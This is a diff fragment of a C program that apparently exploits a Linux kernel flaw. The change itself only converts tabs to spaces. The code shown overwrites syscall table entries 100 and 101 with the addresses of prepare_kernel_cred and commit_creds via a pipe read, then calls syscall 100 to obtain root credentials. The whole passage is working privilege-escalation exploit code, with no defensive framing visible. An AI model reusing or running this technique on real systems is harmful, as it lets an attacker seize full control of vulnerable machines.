@@ -107,13 +107,13 @@ int main() {
     int out = fds[0];
     int in = fds[1];
 
-	write(in, &prepare, 4);
-	// Overwrite syscall 100
-	read(out, (int*)(sys_table) + 100, 4);
+    write(in, &prepare, 4);
+    // Overwrite syscall 100
+    read(out, (int*)(sys_table) + 100, 4);
 
-	write(in, &commit, 4);
-	// Overwrite syscall 101
-	read(out, (int*)(sys_table) + 101, 4);
+    write(in, &commit, 4);
+    // Overwrite syscall 101
+    read(out, (int*)(sys_table) + 101, 4);
 
     // creds = prepare_kernel_cred(0)
     int creds = syscall(100, 0);
